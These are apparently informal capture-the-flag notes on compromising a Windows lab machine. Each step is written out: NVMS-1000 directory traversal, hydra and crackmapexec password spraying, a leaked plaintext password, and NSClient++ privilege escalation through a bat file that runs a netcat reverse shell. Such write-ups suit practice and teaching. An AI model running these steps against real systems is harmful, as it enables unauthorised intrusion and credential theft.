21,22,80,135,139,445,5666,6699,8443(nscp, which is windows version of nrpe) ports open
webpage shows NVMS-1000 login portal. Default creds admin:123456 dont work
sb shares are locked for guest and anonymous
ftp was open to anonymous login. in Nadia's folder, we find a confidential.txt, where she mention she has left a passwords.txt in Nathan's Desktop

On the webpage,
Found a directory traversal vulnerability for nvms-100
capture a get request, and request for
```txt
/../../../../../../../../../../../../windows/win.ini
```
It works.
so we get Users/Nathan/Desktop/Passwords.txt
Doesnt work against smb
`hydra -l nathan -P Passwords.txt 10.129.236.140 ssh`
we create a users.txt with nadine and nathan
try to authenticate with crackmapexec
`crackmapexec ssh 10.129.236.140 -u users.txt -p passwords.txt`
`crackmapexec smb 10.129.236.140 -u users.txt -p passwords.txt`
For both services, nadine has password L1k3B1gBut7s@W0rk
I guess she does like big butts at work!

When we visit port 8443, we are greeted with a login form, which says use command "nscp web -- password --display" to view the password. Okay!

---
ssh to nadine gets us user.txt
but she isnt privileged user
we go to program files/nsclient++/ where we see the nscp.exe
So we try the command `nscp.exe web -- password --display` and it gives us the password 

When we try to visit https://IP:8443 it says only whitelisted IP is 127.0.0.1
So we port forward, `ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184`

visit the 8443, login with the password.
Visit settings > external scripts > scripts
Next, input /settings/external scripts/scripts/shell in the Section field, the command in the Key field, and C:\Temp\pwn.bat in Value . The bat file will be used to run commands as system.
save. then click changes, Save configuration

serve the nc.exe to windows machine.
As nadia, `echo "powershell c:\Temp\nc.exe -e cmd.exe Ip PORT" > pwn.bat`
In the queries section, click run.

---
Note - the webpage for 8443 just would load for me. It would load, but the login prompt wouldnt.